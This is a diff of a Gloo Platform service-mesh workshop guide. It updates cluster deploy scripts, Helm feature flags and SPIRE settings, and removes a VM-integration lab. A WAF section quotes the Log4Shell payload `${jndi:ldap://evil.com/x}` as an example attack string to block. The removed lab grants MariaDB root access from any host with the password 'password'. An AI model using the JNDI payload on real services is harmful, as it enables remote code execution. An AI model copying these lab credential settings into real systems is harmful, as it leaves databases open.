@@ -117,9 +117,9 @@ export CLUSTER2=cluster2
 Run the following commands to deploy three Kubernetes clusters using [Kind](https://kind.sigs.k8s.io/):
 
 ```bash
-./scripts/deploy-multi-with-cilium.sh 1 mgmt
-./scripts/deploy-multi-with-cilium.sh 2 cluster1 us-west us-west-1
-./scripts/deploy-multi-with-cilium.sh 3 cluster2 us-west us-west-2
+./scripts/deploy-aws-with-cilium.sh 1 mgmt
+./scripts/deploy-aws-with-cilium.sh 2 cluster1 us-west us-west-1
+./scripts/deploy-aws-with-cilium.sh 3 cluster2 us-west us-west-2
 ```
 
 Then run the following commands to wait for all the Pods to be ready:
@@ -234,6 +234,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${MGMT} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.4.7
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -243,7 +245,7 @@ helm upgrade --install gloo-platform gloo-platform \
   --version 2.4.7 \
   -f -<<EOF
 licensing:
-  licenseKey: ${GLOO_MESH_LICENSE_KEY}
+  glooTrialLicenseKey: ${GLOO_MESH_LICENSE_KEY}
 common:
   cluster: mgmt
 glooMgmtServer:
@@ -255,6 +257,8 @@ prometheus:
 redis:
   deployment:
     enabled: true
+featureGates:
+  ExternalWorkloads: true
 telemetryGateway:
   enabled: true
   service:
@@ -264,6 +268,7 @@ glooUi:
   serviceType: LoadBalancer
 telemetryCollector:
   enabled: true
+
 EOF
 
 kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
@@ -384,6 +389,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER1} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.4.7
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -405,6 +412,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster1
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 ```
 
@@ -437,6 +465,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER2} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.4.7
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -458,6 +488,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster2
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 ```
 
@@ -3010,7 +3061,7 @@ The Log4Shell vulnerability impacted all Java applications that used the log4j l
 
 Using the Web Application Firewall capabilities you can reject requests containing such headers. 
 
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
 
 Create the WAF policy:
 
@@ -4276,402 +4327,8 @@ kubectl --context ${CLUSTER1} delete accesspolicies -n bookinfo-frontends --all
 
 ## Lab 23 - VM integration with Spire <a name="lab-23---vm-integration-with-spire-"></a>
 
-Let's see how we can configure a VM to be part of the Mesh.
 
-To make it easier (and more fun), we'll use a Docker container to simulate a VM.
-
-The certificates will be generated by the Spire server. We need to restart it to use the intermediate CA certificate generated by the `RootTrustPolicy`.
-
-```bash
-kubectl --context ${CLUSTER1} -n gloo-mesh rollout restart deploy gloo-spire-server
-```
-
-First of all, we need to define a few environment variables:
-
-```bash
-export VM_APP="vm1"
-export VM_NAMESPACE="virtualmachines"
-export VM_NETWORK="vm-network"
-```
-
-Create the namespace that will host the virtual machine:
-
-```bash
-kubectl --context ${CLUSTER1} create namespace "${VM_NAMESPACE}"
-```
-
-Let's update the bookinfo `Workspace` to include the `virtualmachines` namespace of the first cluster:
-
-```bash
-kubectl apply --context ${MGMT} -f - <<EOF
-apiVersion: admin.gloo.solo.io/v2
-kind: Workspace
-metadata:
-  name: bookinfo
-  namespace: gloo-mesh
-  labels:
-    allow_ingress: "true"
-spec:
-  workloadClusters:
-  - name: cluster1
-    namespaces:
-    - name: bookinfo-frontends
-    - name: bookinfo-backends
-    - name: virtualmachines
-  - name: cluster2
-    namespaces:
-    - name: bookinfo-frontends
-    - name: bookinfo-backends
-EOF
-```
-
-We also need to update the gateways `Workspace` to include the `gloo-mesh` namespace of the first cluster (to allow the VM to send metrics to the OTel collector):
-
-```bash
-kubectl apply --context ${MGMT} -f - <<EOF
-apiVersion: admin.gloo.solo.io/v2
-kind: Workspace
-metadata:
-  name: gateways
-  namespace: gloo-mesh
-spec:
-  workloadClusters:
-  - name: cluster1
-    namespaces:
-    - name: istio-gateways
-    - name: gloo-mesh-addons
-    - name: gloo-mesh
-  - name: cluster2
-    namespaces:
-    - name: istio-gateways
-    - name: gloo-mesh-addons
-EOF
-```
-
-Run a Docker container that we'll use to simulate a VM:
-
-```bash
-docker run -d --name vm1 --network kind --privileged -v `pwd`/vm1:/vm djannot/ubuntu-systemd:22.04
-```
-
-Here is the DockerFile used to create the image. It allows us to use systemd.
-
-```
-FROM ubuntu:22.04
-
-# Install systemd
-RUN apt-get update && apt-get install -y systemd systemd-sysv
-
-# Remove unnecessary systemd services that might cause issues
-RUN (cd /lib/systemd/system/sysinit.target.wants/; for i in *; do [ $i == systemd-tmpfiles-setup.service ] || rm -f $i; done); \
-    rm -f /lib/systemd/system/multi-user.target.wants/*;\
-    rm -f /etc/systemd/system/*.wants/*;\
-    rm -f /lib/systemd/system/local-fs.target.wants/*; \
-    rm -f /lib/systemd/system/sockets.target.wants/*udev*; \
-    rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \
-    rm -f /lib/systemd/system/basic.target.wants/*;\
-    rm -f /lib/systemd/system/anaconda.target.wants/*;
-
-# Override the default command, to initiate systemd
-CMD ["/sbin/init"]
-```
-
-Update the DNS configuration:
-
-```bash
-docker exec vm1 bash -c "sed 's/127.0.0.11/8.8.8.8/' /etc/resolv.conf > /vm/resolv.conf"
-docker exec vm1 cp /vm/resolv.conf /etc/resolv.conf
-```
-
-Install the dependencies:
-
-```bash
-docker exec vm1 apt update -y
-docker exec vm1 apt-get install -y iputils-ping curl iproute2 iptables python3 sudo dnsutils
-```
-
-Create routes to allow the VM to access the Pods on the 2 Kubernetes clusters:
-
-```bash
-cluster1_cidr=$(kubectl --context ${CLUSTER1} -n kube-system get pod -l component=kube-controller-manager -o jsonpath='{.items[0].spec.containers[0].command}' | jq -r '.[] | select(. | startswith("--cluster-cidr="))' | cut -d= -f2)
-cluster2_cidr=$(kubectl --context ${CLUSTER2} -n kube-system get pod -l component=kube-controller-manager -o jsonpath='{.items[0].spec.containers[0].command}' | jq -r '.[] | select(. | startswith("--cluster-cidr="))' | cut -d= -f2)
-
-docker exec vm1 $(kubectl --context ${CLUSTER1} get nodes -o=jsonpath='{range .items[*]}{"ip route add "}{"'${cluster1_cidr}' via "}{.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}')
-docker exec vm1 $(kubectl --context ${CLUSTER2} get nodes -o=jsonpath='{range .items[*]}{"ip route add "}{"'${cluster2_cidr}' via "}{.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}')
-```
-
-Copy `meshctl` into the container:
-
-```bash
-docker cp $HOME/.gloo-mesh/bin/meshctl vm1:/usr/local/bin/
-```
-
-Create an `ExternalWorkload` object to represent the VM and the applications it runs:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2alpha1
-kind: ExternalWorkload
-metadata:
-  name: ${VM_APP}
-  namespace: virtualmachines
-  labels:
-    app: ${VM_APP}
-spec:
-  connectedClusters:
-    ${CLUSTER1}: virtualmachines
-  identitySelector:
-    joinToken:
-      enable: true
-  ports:
-    - name: http-vm
-      number: 9999
-    - name: tcp-db
-      number: 3306
-      protocol: TCP
-EOF
-```
-
-<!--bash
-uuid_regex="^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"
-
-# Loop until JOIN_TOKEN matches the UUID format
-while [[ ! "${JOIN_TOKEN}" =~ ${uuid_regex} ]]; do
-    echo "Waiting for JOIN_TOKEN to have the correct format..."
-    export JOIN_TOKEN=$(meshctl external-workload gen-token --kubecontext ${CLUSTER1} --ext-workload virtualmachines/${VM_APP} --trust-domain ${CLUSTER1} --plain 2>&1 | grep INFO | awk '{ print $4}')
-    sleep 1 # Pause for 1 second
-done
--->
-
-Get a Spire token to register the VM:
-
-```bash
-export JOIN_TOKEN=$(meshctl external-workload gen-token \
-  --kubecontext ${CLUSTER1} \
-  --ext-workload virtualmachines/${VM_APP} \
-  --trust-domain ${CLUSTER1} \
-  --plain 2>&1 | grep INFO | awk '{ print $4}')
-```
-
-Get the IP address of the E/W gateway the VM will use to register itself:
-
-```bash
-export EW_GW_ADDR=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=eastwestgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}')
-```
-
-Register the VM:
-
-```bash
-export GLOO_AGENT_URL=https://storage.googleapis.com/gloo-platform/vm/v2.4.7/gloo-workload-agent.deb
-export ISTIO_URL=https://storage.googleapis.com/solo-workshops/istio-binaries/1.19.3/istio-sidecar.deb
-
-docker exec vm1 meshctl ew onboard --install \
-  --attestor token \
-  --join-token ${JOIN_TOKEN} \
-  --cluster ${CLUSTER1} \
-  --gateway-addr ${EW_GW_ADDR} \
-  --gateway istio-gateways/istio-eastwestgateway-1-19 \
-  --trust-domain ${CLUSTER1} \
-  --istio-rev 1-19 \
-  --network vm-network \
-  --gloo ${GLOO_AGENT_URL} \
-  --istio ${ISTIO_URL} \
-  --ext-workload virtualmachines/${VM_APP}
-```
-
-Take a look at the Envoy clusters:
-
-```bash
-docker exec vm1 curl -v localhost:15000/clusters | grep productpage.bookinfo-frontends.svc.cluster.local
-```
-
-It should return several lines similar to the one below:
-
-```,nocopy
-outbound|9080||productpage.bookinfo-frontends.svc.cluster.local::172.18.2.1:15443::cx_active::0
-```
-
-You can see that the IP address corresponds to the IP address of the E/W Gateway.
-
-You should now be able to reach the product page application from the VM:
-
-```bash
-docker exec vm1 curl -I productpage.bookinfo-frontends.svc.cluster.local:9080/productpage
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-exec');
-
-describe("The VM should be able to access the productpage service", () => {
-  const command = 'docker exec vm1 curl -s -o /dev/null -w "%{http_code}" productpage.bookinfo-frontends.svc.cluster.local:9080/productpage';
-  it("Got the expected status code 200", () => helpers.genericCommand({ command: command, responseContains: "200" }));
-})
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-workshop/build/templates/steps/apps/bookinfo/vm-integration-spire/tests/vm-access-productpage.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-Now, let's do the opposite and access an application running in the VM from a Pod.
-
-Run the following command to start a web server:
-
-```bash
-docker exec -d vm1 python3 -m http.server 9999
-```
-
-Try to access the app from the `productpage` Pod:
-
-```bash
-kubectl --context ${CLUSTER1} -n bookinfo-frontends exec $(kubectl --context ${CLUSTER1} -n bookinfo-frontends get pods -l app=productpage -o jsonpath='{.items[0].metadata.name}') -- python -c "import requests; r = requests.get('http://${VM_APP}.virtualmachines.ext.cluster.local:9999'); print(r.text)"
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-exec');
-
-describe("The productpage service should be able to access the VM", () => {
-  const podName = helpers.getOutputForCommand({ command: "kubectl -n bookinfo-frontends get pods -l app=productpage -o jsonpath='{.items[0].metadata.name}' --context " + process.env.CLUSTER1 }).replaceAll("'", "");
-  const command = "kubectl -n bookinfo-frontends exec " + podName + " --context " + process.env.CLUSTER1 + " -- python -c \"import requests; r = requests.get('http://" + process.env.VM_APP + ".virtualmachines.ext.cluster.local:9999'); print(r.status_code)\"";
-  it('Got the expected status code 200', () => helpers.genericCommand({ command: command, responseContains: "200" }));
-});
-EOF
-echo "executing test dist/gloo-mesh-2-0-workshop/build/templates/steps/apps/bookinfo/vm-integration-spire/tests/productpage-access-vm.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-Finally, let's deploy MariaDB in the VM and configure the ratings service to use it as a backend.
-
-```bash
-docker exec vm1 apt-get update
-docker exec vm1 apt-get install -y mariadb-server
-```
-
-We need to configure the database properly:
-
-```bash
-docker exec vm1 sed -i '/bind-address/c\bind-address  = 0.0.0.0' /etc/mysql/mariadb.conf.d/50-server.cnf
-docker exec vm1 systemctl start mysql
-
-docker exec -i vm1 mysql <<EOF
-# Grant access to root
-GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' IDENTIFIED BY 'password' WITH GRANT OPTION;
-# Grant root access to other IPs
-CREATE USER 'root'@'%' IDENTIFIED BY 'password';
-GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
-FLUSH PRIVILEGES;
-SELECT host, user FROM mysql.user;
-EOF
-
-docker exec vm1 systemctl restart mysql
-docker exec vm1 curl -LO https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/src/mysql/mysqldb-init.sql
-docker exec vm1 sh -c 'mysql -u root -ppassword < mysqldb-init.sql'
-```
-
-We can check that the `ratings` table is correctly configured:
-
-```bash
-docker exec vm1 mysql -u root -ppassword test -e "select * from ratings;"
-```
-
-Deploy a new version of the ratings service that is using the database and scale down the current version:
-
-```bash
-kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f data/steps/vm-integration-spire/bookinfo-ratings-v2-mysql-vm.yaml
-```
-
-Scale down the original `ratings` deployment:
-
-```bash
-kubectl --context ${CLUSTER1} -n bookinfo-backends scale deploy/ratings-v1 --replicas=0
-```
-
-Wait for the original deployment to terminate:
-
-```bash
-kubectl --context ${CLUSTER1} -n bookinfo-backends wait --for=delete pod -l app=ratings,version=v1
-```
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("The ratings service should use the database running on the VM", () => {
-  it('Got reviews v2 with ratings in cluster1', () => helpers.checkBody({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', body: 'color="black"', match: true }));
-})
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-workshop/build/templates/steps/apps/bookinfo/vm-integration-spire/tests/ratings-using-vm.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-
-Let's delete the objects we've created:
-
-```bash
-kubectl --context ${CLUSTER1} -n "${VM_NAMESPACE}" delete externalworkload ${VM_APP}
-kubectl --context ${CLUSTER1} delete namespace "${VM_NAMESPACE}"
-kubectl --context ${CLUSTER1} -n bookinfo-backends delete -f https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo-ratings-v2-mysql-vm.yaml
-kubectl --context ${CLUSTER1} -n bookinfo-backends scale deploy/ratings-v1 --replicas=1
-```
-
-Let's apply the original bookinfo Workspace:
-
-```bash
-kubectl apply --context ${MGMT} -f - <<EOF
-apiVersion: admin.gloo.solo.io/v2
-kind: Workspace
-metadata:
-  name: bookinfo
-  namespace: gloo-mesh
-  labels:
-    allow_ingress: "true"
-spec:
-  workloadClusters:
-  - name: cluster1
-    namespaces:
-    - name: bookinfo-frontends
-    - name: bookinfo-backends
-  - name: cluster2
-    namespaces:
-    - name: bookinfo-frontends
-    - name: bookinfo-backends
-EOF
-```
-
-Let's apply the original gateways Workspace:
-
-```bash
-kubectl apply --context ${MGMT} -f - <<EOF
-apiVersion: admin.gloo.solo.io/v2
-kind: Workspace
-metadata:
-  name: gateways
-  namespace: gloo-mesh
-spec:
-  workloadClusters:
-  - name: cluster1
-    namespaces:
-    - name: istio-gateways
-    - name: gloo-mesh-addons
-  - name: cluster2
-    namespaces:
-    - name: istio-gateways
-    - name: gloo-mesh-addons
-EOF
-```
-
-And let's delete the Docker container which represents the VM:
-
-```bash
-docker rm -f vm1
-```
+This step requires v2.5.0
 
 
 
@@ -5643,7 +5300,7 @@ We can use it later to check the failover hasn't impacted the Istio configuratio
 We're going to deploy a new Kubernetes cluster to host the standby Gloo Platform management plane:
 
 ```bash
-./scripts/deploy-multi-with-cilium.sh 4 mgmt2
+./scripts/deploy-aws-with-cilium.sh 4 mgmt2
 ```
 
 Then, run the following commands to wait for all the Pods to be ready:
@@ -5702,7 +5359,7 @@ helm upgrade --install gloo-platform gloo-platform \
   --version 2.4.7 \
   -f -<<EOF
 licensing:
-  licenseKey: ${GLOO_MESH_LICENSE_KEY}
+  glooTrialLicenseKey: ${GLOO_MESH_LICENSE_KEY}
 common:
   cluster: mgmt
 glooMgmtServer:
@@ -5714,6 +5371,8 @@ prometheus:
 redis:
   deployment:
     enabled: true
+featureGates:
+  ExternalWorkloads: true
 telemetryGateway:
   enabled: true
   service:
@@ -5723,6 +5382,7 @@ glooUi:
   serviceType: LoadBalancer
 telemetryCollector:
   enabled: true
+
 EOF
 
 kubectl --context ${MGMT2} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
@@ -5891,6 +5551,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER1} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.4.7
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -5912,6 +5574,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster1
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 
 kubectl apply --context ${MGMT} -f - <<EOF
@@ -5938,6 +5621,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER2} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.4.7
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -5959,6 +5644,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster2
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 ```
 
